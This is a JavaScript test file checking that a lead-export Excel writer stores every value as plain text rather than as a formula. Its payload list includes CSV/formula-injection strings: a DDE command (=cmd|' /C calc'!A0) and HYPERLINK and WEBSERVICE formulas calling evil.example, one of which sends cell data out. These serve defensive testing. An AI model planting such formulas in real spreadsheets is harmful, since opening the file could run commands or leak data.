import { describe, expect, it } from "vitest";
import { CFB, read } from "xlsx";
import { columnName, excelTable } from "../src/utils/excelTable.js";
import {
  pipelineExportColumns,
  pipelineExportHeadings,
} from "../src/services/pipelineExport.js";
// The Excel writer the lead exports share (update 074): one worksheet, the
// heading row bold, frozen and filtered, values exactly as given, and never
// a formula, whatever a customer, an agent or an advertisement wrote.
const parts = (buffer) => {
  const zip = CFB.read(buffer, { type: "buffer" });
  return Object.fromEntries(
    zip.FullPaths.filter((p) => !p.endsWith("/") && !p.includes("Sh33tJ5")).map(
      (p) => [
        p.replace(/^Root Entry\//, ""),
        CFB.find(zip, p).content.toString("utf8"),
      ],
    ),
  );
};
// Text a spreadsheet would run as a formula, or read specially.
const payloads = [
  "=1+1",
  '=HYPERLINK("http://evil.example","Open")',
  "+92 300 1234567",
  "-2+3",
  "@SUM(A1:A2)",
  "\t=cmd|' /C calc'!A0",
  '=WEBSERVICE("http://evil.example/"&A1)',
];

describe("the shared Excel writer", () => {
  it("writes every one of the 37 columns as plain text, never a formula", () => {
    const rows = [
      pipelineExportHeadings,
      ...payloads.map((p) => pipelineExportHeadings.map(() => p)),
    ];
    const buffer = excelTable({
      sheet: "Leads",
      rows,
      columns: pipelineExportColumns,
    });
    const files = parts(buffer);
    const sheet = files["xl/worksheets/sheet1.xml"];
    expect(sheet).not.toMatch(/<f[ >/]/);
    // Every data cell is a text cell.
    const cells = sheet.match(/<c r="[A-Z]+([2-9]|\d{2,})"[^>]*>/g);
    expect(cells).toHaveLength(37 * payloads.length);
    expect(cells.every((c) => / t="s"/.test(c))).toBe(true);
    const book = read(buffer, { type: "buffer", cellFormula: true });
    const ws = book.Sheets.Leads;
    for (let r = 0; r < payloads.length; r++)
      for (let c = 0; c < 37; c++) {
        const cell = ws[columnName(c) + (r + 2)];
        expect(cell.f).toBeUndefined();
        expect(cell.t).toBe("s");
        expect(cell.v).toBe(payloads[r]);
      }
  });

  it("keeps text exactly, within what Excel can hold, and numbers as numbers", () => {
    const text = [
      "Tom & Jerry <b>bold</b> \"quoted\" 'single'",
      "اردو میں پیغام 🏠",
      "_x0041_ stays literal",
      "Line one\nLine two",
      "bad\u0001control\u0008chars",
      "x".repeat(40000),
    ];
    const buffer = excelTable({
      sheet: "Leads",
      rows: [
        ["Note", "Amount", "ID"],
        ...text.map((t, i) => [t, i * 1000.5, 123456]),
      ],
      columns: { Note: { wrap: true, width: 30 }, ID: { text: true } },
    });
    const ws = read(buffer, { type: "buffer" }).Sheets.Leads;
    expect(ws.A2.v).toBe(text[0]);
    expect(ws.A3.v).toBe(text[1]);
    expect(ws.A4.v).toBe("_x0041_ stays literal");
    expect(ws.A5.v).toBe("Line one\nLine two");
    expect(ws.A6.v).toBe("badcontrolchars");
    expect(ws.A7.v).toHaveLength(32767);
    expect(ws.B3).toMatchObject({ t: "n", v: 1000.5 });
    expect(ws.C2).toMatchObject({ t: "s", v: "123456" });
    const sheet = parts(buffer)["xl/worksheets/sheet1.xml"];
    // Wrapped rows are tall enough for their lines (at most six).
    expect(sheet).toMatch(/<row r="5" ht="30" customHeight="1">/);
    expect(sheet).toMatch(/<row r="6">/);
    expect(sheet).toMatch(/<row r="7" ht="90" customHeight="1">/);
  });

  it("is a complete workbook: one sheet, frozen and filtered, every part declared", () => {
    const buffer = excelTable({
      sheet: "Hot leads",
      rows: [
        ["A", "B"],
        ["x", ""],
        ["", 2],
      ],
    });
    const files = parts(buffer);
    expect(Object.keys(files).sort()).toEqual([
      "[Content_Types].xml",
      "_rels/.rels",
      "xl/_rels/workbook.xml.rels",
      "xl/sharedStrings.xml",
      "xl/styles.xml",
      "xl/workbook.xml",
      "xl/worksheets/sheet1.xml",
    ]);
    for (const part of [
      "/xl/workbook.xml",
      "/xl/worksheets/sheet1.xml",
      "/xl/styles.xml",
      "/xl/sharedStrings.xml",
    ])
      expect(files["[Content_Types].xml"]).toContain(`PartName="${part}"`);
    expect(files["xl/workbook.xml"]).toContain(
      `<definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">'Hot leads'!$A$1:$B$3</definedName>`,
    );
    const sheet = files["xl/worksheets/sheet1.xml"];
    expect(sheet).toContain('<autoFilter ref="A1:B3"/>');
    expect(sheet).toContain('state="frozen"');
    // Blanks are empty cells, not empty text.
    expect(sheet).not.toContain('r="B2"');
    expect(sheet).not.toContain('r="A3"');
    const book = read(buffer, { type: "buffer" });
    expect(book.SheetNames).toEqual(["Hot leads"]);
    expect(columnName(0)).toBe("A");
    expect(columnName(25)).toBe("Z");
    expect(columnName(26)).toBe("AA");
    expect(columnName(36)).toBe("AK");
    expect(columnName(701)).toBe("ZZ");
    expect(columnName(702)).toBe("AAA");
  });
});
